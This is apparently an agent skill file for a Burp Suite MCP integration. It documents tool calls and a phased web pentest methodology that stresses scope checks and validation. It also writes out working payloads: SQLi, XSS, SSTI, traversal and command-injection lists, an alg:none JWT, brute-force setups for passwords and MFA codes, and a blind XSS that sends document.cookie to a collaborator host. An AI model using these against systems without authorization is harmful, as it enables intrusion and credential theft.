---
name: burp-mcp
l0: Burp Suite MCP integration — proxy control, HTTP history, active scanning, Intruder, Repeater, and scope management via MCP tools.
license: MIT
metadata:
  version: "1.0.0"
  author: AuditGuard
  tags: ["burp", "mcp", "proxy", "scanner", "intruder", "repeater", "pentest", "web", "automation"]
---

## L1 — Overview

BurpMCP is a Model Context Protocol (MCP) server that exposes Burp Suite's full capabilities to AI agents. It bridges the gap between agent-driven reasoning and Burp's interception, scanning, and manipulation tools, enabling fully autonomous or semi-autonomous web application security testing without manual UI interaction.

**Use this context when:**
- Controlling Burp Suite programmatically through MCP tool calls
- Sending, intercepting, or replaying HTTP requests via the agent
- Retrieving and analysing proxy history, scanner issues, or sitemap data
- Running active scans or Intruder attacks from the agent
- Automating repetitive pentest tasks (brute-forcing, fuzzing, parameter testing)
- Building end-to-end pentest workflows entirely through MCP tool calls
- Integrating Burp findings with `finding-writer`, `cvss-scorer`, or `pentest-report` skills

**Decision flow — where to start:**
1. First engagement on a target → Phase 1 (Setup & Scope) then Phase 2 (Recon via Proxy History and Sitemap)
2. Specific endpoint to test → Phase 3 (Request Crafting and Repeater) then Phase 5 (Active Scanning)
3. Have a list of endpoints → Phase 4 (Intruder / Fuzzing Automation)
4. Burp Scanner already ran → Phase 6 (Issue Triage and Reporting)
5. Uncertain what's possible → read the full Tool Catalog in Phase 0

**Key principle:** Always work within scope. Add targets to Burp scope before any active testing. Every active scan, Intruder attack, and brute-force must be explicitly scoped.

---

## L2 — Full Methodology

---

### Phase 0 — Tool Catalog

A complete reference for every BurpMCP tool call available to the agent. Always check which tools are available at session start with `list_tools` or equivalent. Tool names may vary slightly between BurpMCP versions — use the description to match intent if the name differs.

---

#### 0.1 Proxy and HTTP History Tools

**`get_proxy_history`**
Retrieves HTTP requests and responses captured by Burp's proxy listener.

Parameters:
```
filter (optional):
  - host: "target.com"          — filter by hostname
  - method: "POST"              — filter by HTTP method
  - status_code: 200            — filter by response status
  - url_contains: "/api/"       — filter by URL substring
  - in_scope: true              — return only in-scope items
  - limit: 100                  — maximum items to return (default: all)
  - offset: 0                   — pagination offset
```

Returns: array of `{ id, method, url, status_code, length, mime_type, request_b64, response_b64, timestamp }`

Usage: Start every engagement by pulling the full proxy history to map endpoints the target's application has already generated. Always decode `request_b64` and `response_b64` from base64 before analysis.

**`get_proxy_history_item`**
Retrieves a single proxy history entry by ID with full request/response detail.

Parameters:
```
id: <integer>  — item ID from get_proxy_history result
```

Returns: `{ id, request, response, highlights, comment, timestamp }`

**`search_proxy_history`**
Full-text search across all captured requests and responses.

Parameters:
```
query: "Authorization"         — search term (case-insensitive)
search_in: "request"           — "request", "response", or "both"
regex: false                   — treat query as regex if true
in_scope: true                 — limit to in-scope items only
```

Returns: array of matching proxy history items.

Usage patterns:
```
# Find all requests with Authorization headers
search_proxy_history(query="Authorization", search_in="request")

# Find all responses containing "password" in body
search_proxy_history(query="password", search_in="response")

# Find all API key references
search_proxy_history(query="api[_-]?key", search_in="both", regex=true)

# Find IDOR candidates — numeric IDs in paths
search_proxy_history(query="/[0-9]{4,}/", search_in="request", regex=true)
```

**`highlight_proxy_item`**
Colour-codes a proxy history item for human review.

Parameters:
```
id: <integer>
color: "red" | "orange" | "yellow" | "green" | "cyan" | "blue" | "pink" | "magenta" | "gray"
```

Usage: Mark confirmed findings in red, items requiring review in yellow, confirmed clean items in green.

**`add_comment_to_proxy_item`**
Adds a text comment to a proxy history entry.

Parameters:
```
id: <integer>
comment: "Potential IDOR — change user_id=1234 to 1235"
```

---

#### 0.2 Scope Management Tools

**`get_scope`**
Returns the current Burp scope configuration.

Returns: `{ include: [...], exclude: [...] }` — arrays of URL/pattern strings.

**`add_to_scope`**
Adds a URL or URL pattern to Burp's target scope.

Parameters:
```
url: "https://target.com"           — adds full origin
url: "https://target.com/api/"      — adds path prefix
url: "https://*.target.com"         — wildcard subdomain
```

**`remove_from_scope`**
Removes a URL from scope.

Parameters:
```
url: "https://target.com/logout"    — remove specific path from scope
```

**`is_in_scope`**
Checks whether a specific URL is currently in scope.

Parameters:
```
url: "https://target.com/api/user/1234"
```

Returns: `{ in_scope: true | false }`

Usage: Always call `is_in_scope` before any active test. Abort the test if it returns `false`.

---

#### 0.3 HTTP Request Tools

**`send_http_request`**
Sends an HTTP request through Burp's proxy engine and returns the full response. This is the primary tool for manual request crafting and replay.

Parameters:
```
method: "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "OPTIONS" | "HEAD"
url: "https://target.com/api/user/1234"
headers: {
  "Authorization": "Bearer eyJ...",
  "Content-Type": "application/json",
  "Cookie": "session=abc123"
}
body: '{"user_id": 1234}'   — raw body string (optional)
follow_redirects: true       — follow 3xx responses (default: true)
timeout: 30000               — milliseconds (default: 30000)
```

Returns: `{ status_code, headers, body, length, response_time_ms, raw_request, raw_response }`

**`send_to_repeater`**
Adds a request to Burp's Repeater tab for manual follow-up.

Parameters:
```
request: "<raw HTTP request string>"
host: "target.com"
port: 443
use_https: true
tab_name: "IDOR Test — user 1234"
```

**`get_repeater_tabs`**
Lists all open Repeater tabs.

Returns: `[{ tab_id, name, last_response_status }]`

**`send_repeater_request`**
Sends the request in an existing Repeater tab and returns the response.

Parameters:
```
tab_id: <integer>
```

---

#### 0.4 Intruder / Fuzzing Tools

**`send_to_intruder`**
Configures an Intruder attack. Marks injection points with `§` delimiters.

Parameters:
```
request: "GET /api/user/§1234§ HTTP/1.1\r\nHost: target.com\r\n..."
host: "target.com"
port: 443
use_https: true
attack_type: "sniper" | "battering_ram" | "pitchfork" | "cluster_bomb"
```

Attack types:
- `sniper` — one payload set, one position at a time (IDOR ID fuzzing, parameter discovery)
- `battering_ram` — one payload set inserted into all positions simultaneously
- `pitchfork` — multiple payload sets, one per position, iterated together (credential stuffing)
- `cluster_bomb` — multiple payload sets, all combinations (brute-force with user+pass lists)

**`configure_intruder_payloads`**
Sets the payload source for Intruder positions.

Parameters:
```
position_index: 0                          — which §position§ (0-indexed)
payload_type: "simple_list" | "numbers" | "brute_forcer" | "username_generator" | "custom_iterator"
payloads: ["admin", "root", "user"]        — for simple_list
number_from: 1                             — for numbers type
number_to: 9999
number_step: 1
min_length: 4                              — for brute_forcer
max_length: 6
charset: "abcdefghijklmnopqrstuvwxyz0123456789"
```

**`start_intruder_attack`**
Launches the configured Intruder attack.

Parameters:
```
throttle_ms: 100           — delay between requests (be kind to servers)
concurrent_threads: 5      — parallel threads
follow_redirects: true
```

Returns: `{ attack_id, status: "running" }`

**`get_intruder_results`**
Retrieves results from a completed or running Intruder attack.

Parameters:
```
attack_id: <string>
filter: {
  status_code: 200
  length_differs_from: 3520    — flag responses with different length
  contains: "Welcome"          — flag responses containing string
}
```

Returns: `[{ request_number, payload, status_code, length, response_time_ms, response_body }]`

**`stop_intruder_attack`**
Stops a running Intruder attack.

Parameters:
```
attack_id: <string>
```

---

#### 0.5 Active Scanner Tools

**`start_active_scan`**
Launches Burp's active vulnerability scanner against a URL or set of URLs.

Parameters:
```
urls: ["https://target.com/api/user/1234"]    — specific URL(s) to scan
scope_only: true                               — scan entire scope (ignores urls if true)
scan_config: "thorough" | "balanced" | "light" — scan intensity preset
audit_checks: {                                — fine-grained control (optional)
  sqli: true,
  xss: true,
  os_command_injection: true,
  path_traversal: true,
  file_upload: true,
  ssrf: true,
  xxe: true,
  ssti: true,
  open_redirect: true,
  cors: true
}
insertion_point_types: ["query_params", "body_params", "headers", "cookies", "path_params"]
```

Returns: `{ scan_id, status: "running" | "queued", estimated_duration_minutes }`

**`get_scan_status`**
Checks progress of a running scan.

Parameters:
```
scan_id: <string>
```

Returns: `{ scan_id, status, progress_percent, requests_made, issues_found_so_far }`

**`get_scanner_issues`**
Retrieves all findings reported by Burp Scanner.

Parameters:
```
scan_id: <string>                  — specific scan (optional; omit for all issues)
severity: "high" | "medium" | "low" | "info"   — filter by severity (optional)
confidence: "certain" | "firm" | "tentative"   — filter by confidence (optional)
host: "target.com"                 — filter by host (optional)
issue_type: "sql_injection"        — filter by vulnerability class (optional)
```

Returns: `[{ issue_id, name, severity, confidence, host, path, parameter, description, remediation, request_b64, response_b64 }]`

**`get_scanner_issue_detail`**
Full detail for a single scanner issue, including evidence.

Parameters:
```
issue_id: <string>
```

Returns full issue with `request`, `response`, `evidence`, `cvss`, `cwe_id`, `remediation`, `references`.

**`cancel_scan`**
Stops an active scan.

Parameters:
```
scan_id: <string>
```

---

#### 0.6 Sitemap Tools

**`get_sitemap`**
Returns all URLs Burp has discovered (proxy history + spider + scanner).

Parameters:
```
host: "target.com"         — filter by host (optional)
in_scope: true             — in-scope items only (optional)
show_only_with_responses: true
```

Returns: `[{ url, method, status_code, mime_type, length }]`

**`get_sitemap_item`**
Returns a specific sitemap entry with request and response.

Parameters:
```
url: "https://target.com/api/user/1234"
```

---

#### 0.7 Encoding / Decoding Tools

**`encode_decode`**
Performs encoding and decoding operations (equivalent to Burp's Decoder tab).

Parameters:
```
value: "admin' OR '1'='1"
operation: "url_encode" | "url_decode" | "base64_encode" | "base64_decode" | "html_encode" | "html_decode" | "hex_encode" | "hex_decode" | "md5" | "sha1" | "sha256"
```

Returns: `{ result: "<encoded/decoded string>" }`

Usage example:
```
encode_decode(value="' OR 1=1--", operation="url_encode")
→ { result: "%27%20OR%201%3D1--" }
```

---

#### 0.8 Collaborator / OOB Tools

**`get_collaborator_payload`**
Generates a unique Burp Collaborator interaction URL for out-of-band detection.

Returns: `{ payload: "abc123.burpcollaborator.net", full_url: "http://abc123.burpcollaborator.net" }`

**`poll_collaborator`**
Checks if any DNS/HTTP/SMTP interactions have been received for a Collaborator payload.

Parameters:
```
payload: "abc123.burpcollaborator.net"
```

Returns: `[{ type: "dns" | "http" | "smtp", from_ip, timestamp, request_body }]`

Usage: Use `get_collaborator_payload` before injecting SSRF, blind XSS, blind SQLi, or XXE payloads. Then `poll_collaborator` to confirm out-of-band interaction.

---

### Phase 1 — Setup and Scope Configuration

Before any testing begins, configure Burp and establish scope. An incorrectly scoped session will pollute history and risk out-of-scope testing.

**Step 1.1 — Verify BurpMCP connection**

```
list_tools()
# Expected: returns list including get_proxy_history, send_http_request, start_active_scan, etc.
# If tools are missing → check Burp Extensions tab, confirm BurpMCP is loaded and running.
```

**Step 1.2 — Configure scope**

```python
get_scope()                                      # view current scope
add_to_scope(url="https://target.com")           # add primary target
add_to_scope(url="https://api.target.com")       # add API subdomain if separate
add_to_scope(url="https://staging.target.com")   # add staging if in scope
remove_from_scope(url="https://target.com/logout")  # exclude logout to avoid session loss
get_scope()                                      # confirm
```

**Step 1.3 — Validate scope before every active test**

```python
is_in_scope(url="https://target.com/api/user/1234")
# → { in_scope: true }  → proceed
# → { in_scope: false } → STOP — do not test this URL
```

**Step 1.4 — Verify traffic routes through Burp**

```python
send_http_request(method="GET", url="https://target.com/", follow_redirects=true)
get_proxy_history(filter={ host: "target.com", limit: 5 })
# The GET / request must appear in history — if not, the proxy is not intercepting traffic
```

---

### Phase 2 — Reconnaissance via Burp

Use Burp's accumulated data to map the attack surface before any active testing.

**Step 2.1 — Pull full proxy history**

```python
history = get_proxy_history(filter={ in_scope: true, limit: 5000 })
# Analyse: unique hosts, path patterns, HTTP methods, status codes, content types, visible parameters
```

**Step 2.2 — Build endpoint inventory**

```python
# POST endpoints (have request bodies with parameters)
post_requests = get_proxy_history(filter={ method: "POST", in_scope: true })

# Authenticated endpoints
auth_endpoints = search_proxy_history(query="Authorization: Bearer", search_in="request")

# API surface
api_endpoints = get_proxy_history(filter={ url_contains: "/api/", in_scope: true })

# File upload points
upload_endpoints = search_proxy_history(query="multipart/form-data", search_in="request")
```

**Step 2.3 — Find high-value targets**

```python
# IDOR candidates — numeric IDs in paths
search_proxy_history(query="/\\d{3,}/", search_in="request", regex=true)

# Password reset / account management
search_proxy_history(query="reset|forgot|password|change-email", search_in="request", regex=true)

# Admin endpoints
search_proxy_history(query="/admin/|/management/|/dashboard/", search_in="request", regex=true)

# JWT tokens
search_proxy_history(query="eyJ[a-zA-Z0-9]{10,}\\.", search_in="request", regex=true)

# Secrets in responses
search_proxy_history(query="token|secret|api_key|password", search_in="response")

# GraphQL
search_proxy_history(query="graphql|__schema|mutation", search_in="request")
```

**Step 2.4 — Examine sitemap**

```python
sitemap = get_sitemap(host="target.com", in_scope=true, show_only_with_responses=true)
# Prioritise: 403 (forbidden — may be bypassable), 401 (auth-required), 500 (injection candidates)
# Flag: paths containing "admin", "config", "backup", "debug", "internal"
```

**Step 2.5 — Annotate findings**

```python
for item in idor_candidates:
    highlight_proxy_item(id=item.id, color="orange")
    add_comment_to_proxy_item(id=item.id, comment="IDOR candidate — numeric ID in path")

for item in admin_endpoints:
    highlight_proxy_item(id=item.id, color="red")
    add_comment_to_proxy_item(id=item.id, comment="Admin endpoint — test with low-priv session")
```

---

### Phase 3 — Manual Request Testing (Repeater Workflow)

**Step 3.1 — Baseline request**

```python
baseline = send_http_request(
    method="GET",
    url="https://target.com/api/user/1234",
    headers={"Authorization": "Bearer eyJ...", "Cookie": "session=abc123"}
)
# Record: baseline.status_code, baseline.length, baseline.body
```

**Step 3.2 — IDOR testing**

```python
# Your own user — should succeed
own = send_http_request(method="GET", url="https://target.com/api/user/1234",
    headers={"Authorization": "Bearer <your_token>"})

# Another user's ID — should fail
other = send_http_request(method="GET", url="https://target.com/api/user/1235",
    headers={"Authorization": "Bearer <your_token>"})

if other.status_code == 200 and "email" in other.body:
    # IDOR confirmed — another user's data returned
    highlight_proxy_item(id=other_history_id, color="red")
    add_comment_to_proxy_item(id=other_history_id, comment="CONFIRMED IDOR — returns user 1235 data to user 1234")
```

**Step 3.3 — Authentication bypass testing**

```python
# No auth header
r1 = send_http_request(method="GET", url="https://target.com/api/user/me")

# alg:none JWT
none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
r2 = send_http_request(method="GET", url="https://target.com/api/user/me",
    headers={"Authorization": f"Bearer {none_jwt}"})

# Expired token
r3 = send_http_request(method="GET", url="https://target.com/api/user/me",
    headers={"Authorization": "Bearer <expired_token>"})

for label, resp in [("no_auth", r1), ("alg_none", r2), ("expired", r3)]:
    if resp.status_code == 200:
        print(f"AUTH BYPASS via {label}")
        highlight_proxy_item(id=resp.proxy_id, color="red")
```

**Step 3.4 — Parameter tampering**

```python
# Price manipulation
send_http_request(method="POST", url="https://target.com/api/order",
    headers={"Authorization": "Bearer <token>", "Content-Type": "application/json"},
    body='{"product_id": 1, "quantity": 1, "price": 0.01}')

# Negative quantity
send_http_request(method="POST", url="https://target.com/api/order",
    headers={"Authorization": "Bearer <token>", "Content-Type": "application/json"},
    body='{"product_id": 1, "quantity": -1, "price": 99.99}')

# Mass assignment — inject privileged fields
send_http_request(method="POST", url="https://target.com/api/user/register",
    headers={"Content-Type": "application/json"},
    body='{"username":"evil","password":"evil","email":"evil@evil.com","role":"admin","is_admin":true}')
```

**Step 3.5 — HTTP method bypass**

```python
for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]:
    r = send_http_request(method=method, url="https://target.com/admin/users",
        headers={"Authorization": "Bearer <low_priv_token>"})
    if r.status_code not in [401, 403, 405]:
        print(f"HTTP method bypass: {method} → {r.status_code}")
        highlight_proxy_item(id=r.proxy_id, color="red")
```

**Step 3.6 — Send to Repeater**

```python
raw = "GET /api/user/1234 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer eyJ...\r\n\r\n"
send_to_repeater(request=raw, host="target.com", port=443, use_https=True, tab_name="IDOR — /api/user/{id}")
send_repeater_request(tab_id=5)
```

---

### Phase 4 — Automated Fuzzing (Intruder Workflow)

**Step 4.1 — IDOR enumeration**

```python
request = "GET /api/user/§1234§ HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer eyJ...\r\n\r\n"
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="numbers", number_from=1, number_to=9999)
attack = start_intruder_attack(throttle_ms=150, concurrent_threads=5)
results = get_intruder_results(attack_id=attack.attack_id, filter={ status_code: 200 })
# Any 200 for IDs that are not your own = IDOR
```

**Step 4.2 — Credential brute-force**

```python
request = """POST /api/login HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"username":"admin","password":"§password§"}"""
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="simple_list",
    payloads=["admin", "password", "123456", "admin123", "letmein", "qwerty", "Password1", "Admin@2024"])
attack = start_intruder_attack(throttle_ms=500, concurrent_threads=2)
results = get_intruder_results(attack_id=attack.attack_id, filter={ status_code: 200, contains: "token" })
```

**Step 4.3 — Username enumeration via timing**

```python
request = """POST /api/login HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"username":"§user§","password":"wrongpassword"}"""
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="simple_list",
    payloads=["admin", "administrator", "root", "test", "user", "demo", "support"])
attack = start_intruder_attack(throttle_ms=200, concurrent_threads=1)
results = get_intruder_results(attack_id=attack.attack_id)
# Sort by response_time_ms — longer times = valid usernames
# Also compare response lengths — different length can indicate valid user
```

**Step 4.4 — Injection fuzzing**

```python
request = """GET /search?q=§test§ HTTP/1.1\r\nHost: target.com\r\nCookie: session=abc\r\n\r\n"""
payloads = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "{{7*7}}", "${7*7}", "*{7*7}",
    "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "http://169.254.169.254/latest/meta-data/",
    ";id", "|id", "`id`", "$(id)", "; sleep 5", "| sleep 5"
]
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="simple_list", payloads=payloads)
attack = start_intruder_attack(throttle_ms=300, concurrent_threads=3)
results = get_intruder_results(attack_id=attack.attack_id, filter={ length_differs_from: baseline_length })
```

**Step 4.5 — Endpoint discovery**

```python
request = """GET /api/§FUZZ§ HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer eyJ...\r\n\r\n"""
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="simple_list",
    payloads=["users", "admin", "config", "settings", "debug", "health", "status", "metrics",
              "logs", "backup", "export", "import", "upload", "download", "v1", "v2",
              "internal", "private", "secret", "token", "keys"])
attack = start_intruder_attack(throttle_ms=100, concurrent_threads=10)
results = get_intruder_results(attack_id=attack.attack_id, filter={ status_code: 200 })
# Also check 301, 302, 401, 403 — these all indicate the endpoint exists
```

**Step 4.6 — OTP / MFA brute-force**

```python
request = """POST /api/mfa/verify HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\nCookie: session=partial_session\r\n\r\n{"otp":"§000000§"}"""
send_to_intruder(request=request, host="target.com", port=443, use_https=True, attack_type="sniper")
configure_intruder_payloads(position_index=0, payload_type="numbers", number_from=0, number_to=999999)
attack = start_intruder_attack(throttle_ms=50, concurrent_threads=10)
results = get_intruder_results(attack_id=attack.attack_id, filter={ status_code: 200, contains: "success" })
# 200 + "success" = OTP brute-forced — missing rate limiting on MFA endpoint
```

---

### Phase 5 — Active Scanning

**Step 5.1 — Scope-wide balanced scan**

```python
is_in_scope(url="https://target.com/api/")  # confirm scope first

scan = start_active_scan(
    scope_only=True,
    scan_config="balanced",
    audit_checks={ "sqli": True, "xss": True, "os_command_injection": True,
                   "path_traversal": True, "ssrf": True, "xxe": True, "ssti": True,
                   "open_redirect": True, "cors": True }
)
# → { scan_id: "scan-abc123", status: "running", estimated_duration_minutes: 45 }
```

**Step 5.2 — Targeted thorough scan**

```python
scan = start_active_scan(
    urls=["https://target.com/api/search", "https://target.com/upload"],
    scan_config="thorough",
    insertion_point_types=["query_params", "body_params", "headers", "cookies"]
)
```

**Step 5.3 — Monitor progress**

```python
import time
while True:
    status = get_scan_status(scan_id=scan.scan_id)
    # status.progress_percent, status.issues_found_so_far, status.requests_made
    if status.status in ["finished", "failed", "cancelled"]:
        break
    time.sleep(30)
```

**Step 5.4 — Triage scanner issues**

```python
issues = get_scanner_issues(scan_id=scan.scan_id)

# Prioritise by severity and confidence
critical_high = [i for i in issues if i.severity in ["high", "critical"] and i.confidence in ["certain", "firm"]]

# Manually verify every finding — never report scanner output without replay
for issue in critical_high:
    detail = get_scanner_issue_detail(issue_id=issue.issue_id)
    verification = send_http_request(
        method=detail.request.method,
        url=detail.request.url,
        headers=detail.request.headers,
        body=detail.request.body
    )
    # If verification.body matches scanner evidence → confirmed finding
```

---

### Phase 6 — Out-of-Band (OOB) Detection

**Step 6.1 — Blind SSRF**

```python
collab = get_collaborator_payload()

send_http_request(method="POST", url="https://target.com/api/webhook",
    headers={"Authorization": "Bearer <token>", "Content-Type": "application/json"},
    body=f'{{"url": "http://{collab.payload}/ssrf-test"}}')

time.sleep(5)
interactions = poll_collaborator(payload=collab.payload)
if interactions:
    # DNS or HTTP interaction received → blind SSRF confirmed
```

**Step 6.2 — Blind XSS**

```python
collab = get_collaborator_payload()
blind_xss = f'"><script>fetch("http://{collab.payload}/xss?c="+document.cookie)</script>'

send_http_request(method="POST", url="https://target.com/api/support/ticket",
    headers={"Authorization": "Bearer <user_token>", "Content-Type": "application/json"},
    body=f'{{"subject": "Help", "body": "{blind_xss}"}}')

time.sleep(120)  # Wait for admin to view the ticket
interactions = poll_collaborator(payload=collab.payload)
if interactions and any(i.type == "http" for i in interactions):
    # Admin viewed ticket → XSS executed → stored XSS confirmed
```

**Step 6.3 — Blind OS command injection**

```python
collab = get_collaborator_payload()
payloads = [
    f"`nslookup {collab.payload}`",
    f"$(nslookup {collab.payload})",
    f"; nslookup {collab.payload}",
    f"| nslookup {collab.payload}"
]

for payload in payloads:
    encoded = encode_decode(value=payload, operation="url_encode")
    send_http_request(method="GET",
        url=f"https://target.com/api/ping?host={encoded.result}",
        headers={"Authorization": "Bearer <token>"})
    time.sleep(3)
    interactions = poll_collaborator(payload=collab.payload)
    if interactions:
        # DNS interaction → OS command injection confirmed
        break
```

**Step 6.4 — Blind XXE**

```python
collab = get_collaborator_payload()
xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{collab.payload}/xxe">]>
<root><data>&xxe;</data></root>"""

send_http_request(method="POST", url="https://target.com/api/import",
    headers={"Content-Type": "application/xml", "Authorization": "Bearer <token>"},
    body=xxe_payload)

time.sleep(5)
interactions = poll_collaborator(payload=collab.payload)
if interactions:
    # HTTP/DNS interaction → XXE confirmed
```

---

### Phase 7 — Validation Gate

Before reporting any finding, validate it is real, reproducible, and impactful. Never report Intruder or Scanner results without manual verification.

```
[ ] Reproduced in a clean session (fresh cookies/token, different user account)
[ ] Finding affects resources beyond the tester's own account
[ ] Impact is demonstrated with real evidence, not theoretical
    - IDOR: another user's actual data is returned
    - XSS: JavaScript executed in a real browser context
    - SQLi: data extracted or sleep() timer confirmed
    - Auth bypass: protected endpoint accessed without credentials
[ ] Evidence captured:
    - Full raw HTTP request (from get_proxy_history_item)
    - Full raw HTTP response (from get_proxy_history_item)
[ ] Scanner findings manually replayed with send_http_request to confirm
[ ] Finding is within scope — confirmed with is_in_scope()
[ ] Intruder results reviewed individually — not mass-reported
[ ] Collaborator interactions corroborated with a second poll
```

---

### Phase 8 — False Positive Filter

Do not report without additional exploitation evidence:

```
[ ] Scanner findings rated "Tentative" confidence — always replay manually first
[ ] Intruder response length difference ≤ 10 bytes (likely noise)
[ ] Missing security headers without a working exploit chain
[ ] CSRF on endpoints requiring re-authentication
[ ] Open redirect on unauthenticated pages with no OAuth / sensitive flow
[ ] Self-XSS (executes only in your own browser)
[ ] Rate limiting absence on non-sensitive public endpoints
[ ] Framework version disclosure without a known CVE
[ ] Time-based SQLi where variance is < 4s (may be network jitter, not SQLi)
[ ] Intruder 200 responses that return your own user data (same data, different ID format)
```

---

### Phase 9 — Reporting

**Step 9.1 — Collect evidence from Burp**

```python
issue = get_scanner_issue_detail(issue_id="iss-abc123")
proxy_item = get_proxy_history_item(id=1452)

# Evidence package per finding:
# - proxy_item.request / proxy_item.response → raw HTTP evidence
# - issue.evidence → scanner-specific evidence snippet
# - issue.cvss → input for cvss-scorer skill
# - issue.cwe_id → CWE reference
# - issue.remediation → starting point for remediation section
```

**Step 9.2 — Hand off to reporting skills**

After collecting evidence from Burp:
- `finding-writer` skill → converts raw request/response evidence into a structured finding
- `cvss-scorer` skill → computes CVSS 3.1 base score from the issue context
- `remediation-planner` skill → generates a prioritised fix plan
- `pentest-report` skill → assembles all findings into a full engagement report

**Step 9.3 — Export confirmed findings**

```python
all_history = get_proxy_history(filter={ in_scope: True })
red_items = [i for i in all_history if i.highlight_color == "red"]

for item in red_items:
    detail = get_proxy_history_item(id=item.id)
    # detail.request and detail.response = evidence for appendix
```

---

### Quick Reference — Tool by Attack Class

| Attack Class | Primary Tools | Key Config |
|---|---|---|
| IDOR Enumeration | `send_to_intruder`, `get_intruder_results` | `attack_type: sniper`, `payload_type: numbers` |
| Credential Brute-force | `send_to_intruder`, `start_intruder_attack` | `attack_type: cluster_bomb`, throttle 500ms+ |
| Manual Tampering | `send_http_request`, `send_to_repeater` | Full headers + body manipulation |
| Blind SSRF | `get_collaborator_payload`, `poll_collaborator` | Inject payload URL, poll after 5s |
| Blind XSS | `get_collaborator_payload`, `poll_collaborator` | Inject into admin-visible fields, poll after 2min |
| Active Scanning | `start_active_scan`, `get_scanner_issues` | `scan_config: balanced`, `scope_only: true` |
| Attack Surface Map | `get_proxy_history`, `get_sitemap`, `search_proxy_history` | `in_scope: true`, regex search |
| Parameter Fuzzing | `send_to_intruder` | `payload_type: simple_list`, injection strings |
| Blind Command Injection | `get_collaborator_payload`, `encode_decode`, `send_http_request` | `nslookup`/`curl` to collaborator |
| Blind XXE | `send_http_request` + collaborator | `Content-Type: application/xml` |
| Scope Management | `get_scope`, `add_to_scope`, `is_in_scope` | Always check before active tests |
| Evidence Collection | `get_proxy_history_item`, `get_scanner_issue_detail` | Decode `request_b64`, `response_b64` |

---

### Session Sequence — Recommended Tool Invocation Order

```
SESSION START
│
├── 1. list_tools()                          → confirm BurpMCP is live
├── 2. get_scope()                           → check existing scope
├── 3. add_to_scope(url=target)              → establish target scope
├── 4. get_proxy_history(filter=in_scope)    → review accumulated traffic
├── 5. get_sitemap(in_scope=true)            → map discovered endpoints
├── 6. search_proxy_history(...)             → find high-value targets and annotate
│
├── MANUAL TESTING
│   ├── send_http_request(...)               → craft and replay test requests
│   ├── send_to_repeater(...)                → structured session tabs
│   ├── highlight_proxy_item(...)            → mark interesting items
│   └── add_comment_to_proxy_item(...)       → annotate findings inline
│
├── AUTOMATED FUZZING
│   ├── send_to_intruder(...)                → configure attack with § positions
│   ├── configure_intruder_payloads(...)     → set payload list / number range
│   ├── start_intruder_attack(...)           → launch
│   └── get_intruder_results(...)            → triage (filter by status / length)
│
├── ACTIVE SCANNING
│   ├── start_active_scan(...)               → launch scanner
│   ├── get_scan_status(...)                 → poll every 30s
│   └── get_scanner_issues(...)              → triage by severity + confidence
│
├── OOB DETECTION
│   ├── get_collaborator_payload()           → unique interaction URL
│   ├── [inject into SSRF / XSS / XXE / CMDi payloads]
│   └── poll_collaborator(...)               → check interactions
│
├── VALIDATION
│   ├── send_http_request(...)               → manually replay every finding
│   └── get_proxy_history_item(...)          → collect raw request/response evidence
│
└── REPORTING
    ├── get_scanner_issue_detail(...)        → structured finding data + CVSS + CWE
    └── [pass to finding-writer / cvss-scorer / remediation-planner / pentest-report skills]
```

---

### Troubleshooting

**BurpMCP tools not available:**
- Confirm BurpMCP extension is loaded: Burp → Extensions → Installed
- Check the MCP server port in `~/.claude/mcp.json` matches the extension config
- Reload the extension: Burp → Extensions → BurpMCP → Reload
- Check the Extension output tab for error messages

**`send_http_request` returns connection errors:**
- Burp proxy must be running on `127.0.0.1:8080`
- Install Burp CA certificate in the system trust store for HTTPS targets
- Check SSL pass-through settings — Burp must intercept HTTPS for the target domain

**`get_proxy_history` returns empty:**
- Traffic is not routing through Burp — configure browser/app to use `127.0.0.1:8080`
- Check Burp Proxy → Options → Proxy Listeners — ensure listener is active

**Intruder is slow (Community Edition):**
- Burp Community limits Intruder to 1 thread with throttling
- Burp Pro removes throttling — set `concurrent_threads` to 20+
- Reduce payload list for faster iterations

**Collaborator shows no interactions:**
- Target server may not have internet access — use internal OOB alternative (interactsh)
- Interactions can take up to 30s — increase `time.sleep` before polling
- Verify the payload was actually injected into the request (check proxy history)

**Scanner issues are all "Tentative":**
- Manually replay every tentative finding with `send_http_request`
- Never report tentative findings without confirmed exploitation
- Run a `thorough` scan on specific endpoints for higher-confidence results
